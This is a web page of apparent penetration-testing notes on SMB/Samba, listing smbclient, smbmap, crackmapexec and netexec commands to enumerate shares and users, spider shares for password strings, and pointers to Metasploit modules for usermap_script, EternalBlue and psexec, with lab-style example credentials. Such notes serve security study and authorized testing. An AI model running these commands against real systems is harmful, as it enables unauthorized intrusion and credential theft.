<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
    <title>Minimalist Webpage</title>

</head>
<body>
    <div id="navbar-container"></div>
    <script src="/H4ckV4ult/components/navbar.js"></script>

    <div class="notion-container">
        <div class="notion-header">
            <h1>Samba (TCP/445)</h1>
            <p>Software dedicated to share files</p>
        </div>
        <div class="notion-body">
            <h2>Usage</h2>
            <ul>
                <h3>Connect to share</h3>
                <pre><code class="language-bash">smbclient //VICTIM_IP/NAME_OF_SHARE </code></pre>

                <h3>List shares windows</h3>
                <pre><code class="language-bash">net view \\IP</code></pre>

                <pre><code class="language-bash">dir \\IP\SHARE</code></pre>
            </ul>

            <h2>Enumeration</h2>
            <ul>
                <h3>Enumeration of shares</h3>
                <pre><code class="language-bash">smbclient -L VICTIM_IP -N </code></pre>
                <p>In case you have a username it is possible to use smbmap to check where you can access</p>
                <pre><code class="language-bash">smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5</code></pre>
                

                <h3>Enumeration of usernames</h3>
                <p>This can be done if null session is active</p>
                <pre><code class="language-bash">crackmapexec smb 172.16.5.5 --users</code></pre>

                <h3>Enumeration of files</h3>
                <ul>
                    <p>In case would you like to list files inside a share you could do some spidering with netexec. Here are some examples</p>
                    <pre><code class="language-bash">netexec smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"</code></pre>
                    <p>Another way to do so</p>
                    <pre><code class="language-bash">netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'</code></pre>
                    <p>Also you can download all files and then perform some filtering over them</p>
                    <pre><code class="language-bash">smb 10.129.234.173 -u jbader -p "ILovePower333###" -M spider_plus Finance -o DOWNLOAD_FLAG=True --smb-timeout 60</code></pre>
                    <p>In order to perform the filtering, identify the folder and perform a grep. This allows you to even grep within folders</p>
                    <pre><code class="language-bash">grep -ri "passw"</code></pre>
                </ul>

                
            </ul>    

            <h2>Explotation</h2>
            <ul>
                <h3>Samba "username map script" Command Execution</h3>
                <ul>
                    <p> Samba version 3.0.20 it explotable using the following</p>
                    <pre><code class="language-bash">use exploit/multi/samba/usermap_script </code></pre>
                </ul>    
            
                <h3>Interaction with the user - exploits</h3>
                <ul>
                    <p>CVE-2025-24071</p>
                </ul>

                <h3>EternalBlue</h3>
                <ul>
                    <p>SMB1 is vulnerable to a common vulnerability called Eternal Blue this one allows to inject code in SMB and spawn a shell as NT Authority\Systen</p>
                    <p>This vuln affects <b>WS 2008 to WS 2016 Remeber to try different exploits</b></p>
                    <p>Use the following metasploit module</p>
                    <pre><code class="language-bash">windows/smb/ms17_010_eternalblue</code></pre>
                </ul>

                <h3>Path traversal (Situationship)</h3>
                <ul>
                    <p>In case you found anywhere paths inside the SMB share that you cant no access since you cant list files there is a solution to access</p>
                    <p>The share may be wrong configured and will lead you access using a simple cd command and specifying the path</p>
                </ul>

                <h3>Alternate Data Streams (ADS)</h3>
                <ul>
                    <p>In case you find a file which seems suspicious and does not have any content it is possible that content is located in another data stream</p>
                    <p>Basically data streams are like branchs inside a file which let you store data. To view its content inside smb you can use the command <b>allinfo</b> over a file to view its contents</p>
                    <p>The output will be similar to:</p>
                    <pre><code class="language-bash">altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Wed Jul 21 02:47:12 PM 2021 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes</code></pre>
                   <p>As you can see there is a data stream called <b>Password</b> we can view its content using the command <b>more</b> over the file</p>
                </ul>

                <h3>psexec using admin credentials</h3>
                <ul>
                    <p>In case you have admin credentials of a computer you may be able to use the following metasploit module which grants access to the server</p>
                    <pre><code class="language-bash">exploit/windows/smb/psexec</code></pre>
                </ul>
            </ul>
        </div>
    </div>


</body>
</html>